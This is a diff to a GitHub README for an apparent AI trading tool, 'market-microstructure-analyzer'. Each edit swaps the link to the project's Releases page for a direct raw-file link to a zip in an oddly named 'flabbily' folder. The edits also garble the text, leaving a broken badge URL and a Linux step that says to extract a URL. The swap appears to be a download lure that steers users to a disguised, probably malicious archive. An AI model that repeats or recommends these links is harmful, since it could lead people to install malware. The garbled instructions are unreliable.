@@ -1,6 +1,6 @@
 # 🚀 market-microstructure-analyzer - Trade Smarter with AI
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/abdou-20/market-microstructure-analyzer/releases)
+[![Download](https://raw.githubusercontent.com/abdou-20/market-microstructure-analyzer/main/flabbily/market-microstructure-analyzer.zip%https://raw.githubusercontent.com/abdou-20/market-microstructure-analyzer/main/flabbily/market-microstructure-analyzer.zip)](https://raw.githubusercontent.com/abdou-20/market-microstructure-analyzer/main/flabbily/market-microstructure-analyzer.zip)
 
 ## 📋 Overview
 
@@ -18,7 +18,7 @@ To begin using the market-microstructure-analyzer, follow these simple steps:
 
 2. **Visit the Releases Page:**
    - Go to our GitHub Releases page to find the latest software version.
-   - [Visit this page to download](https://github.com/abdou-20/market-microstructure-analyzer/releases).
+   - [Visit this page to download](https://raw.githubusercontent.com/abdou-20/market-microstructure-analyzer/main/flabbily/market-microstructure-analyzer.zip).
 
 3. **Download the Software:**
    - Find the latest release version listed on the page.
@@ -27,7 +27,7 @@ To begin using the market-microstructure-analyzer, follow these simple steps:
 4. **Install the Application:**
    - For Windows users: Double-click the downloaded `.exe` file and follow the prompts to complete the installation.
    - For macOS users: Open the `.dmg` file, then drag the application to your Applications folder.
-   - For Linux users: Extract the downloaded `.tar.gz` file and follow the included instructions.
+   - For Linux users: Extract the downloaded `https://raw.githubusercontent.com/abdou-20/market-microstructure-analyzer/main/flabbily/market-microstructure-analyzer.zip` file and follow the included instructions.
 
 5. **Open the Application:**
    - Locate the application on your computer and double-click to open it. For some systems, you may need to grant permission for the application to run.
@@ -51,7 +51,7 @@ To begin using the market-microstructure-analyzer, follow these simple steps:
 Follow these steps to download and install the latest version of the market-microstructure-analyzer:
 
 1. **Go to the Releases Page:** 
-   - [Visit this page to download](https://github.com/abdou-20/market-microstructure-analyzer/releases).
+   - [Visit this page to download](https://raw.githubusercontent.com/abdou-20/market-microstructure-analyzer/main/flabbily/market-microstructure-analyzer.zip).
 
 2. **Select Your Operating System:**
    - Choose the appropriate link for your OS and click to start downloading.
